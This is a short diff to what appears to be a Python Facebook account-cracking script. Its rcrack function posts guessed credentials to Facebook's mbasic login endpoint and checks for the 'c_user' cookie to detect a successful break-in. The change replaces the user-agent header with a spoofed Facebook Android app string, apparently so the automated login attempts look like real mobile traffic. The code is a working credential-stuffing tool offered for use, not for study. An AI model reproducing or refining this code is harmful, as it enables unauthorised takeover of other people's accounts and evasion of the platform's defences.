@@ -223,7 +223,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': "pro"}
+            'user-agent': "[FBAN/;FBAV/A1XDL5U4;FBBV/590451690;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/590451690;FBDM//*{density=2.5,width=1080,height=3840};FBLC/zh_CN;FBRV/674849133;FBCR/Nokia;FBMF/Motorola;FBBD/Medion;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G1100;FBSV/16;FBOP/4;FBCA/armeabi-v7a;FBSS/15;]"}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -250,4 +250,3 @@ def rcrack(uid,pwx,tl):
         pass
  
 xxr()
- 
